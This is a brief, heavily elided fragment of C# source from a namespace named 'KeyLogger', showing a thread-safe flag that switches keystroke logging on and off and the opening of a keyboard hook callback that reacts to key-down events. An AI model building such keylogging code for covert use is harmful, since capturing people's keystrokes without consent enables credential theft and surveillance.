...
namespace KeyLogger
{
    ...
    class InterceptKeys
    {
        // Flag to control whether keylogging is active (thread-safe)
        private static volatile bool _isLoggingActive = false;
        ...
        /// </summary>
        public static void SetLoggingActive(bool active)
        {
            lock (_lockObject)
            {
                _isLoggingActive = active;
            }
        }

        /// <summary>
        /// Check if keylogging is currently active
        /// </summary>
        ...
        {
            // Only log if keylogging is active
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN && _isLoggingActive)
            {
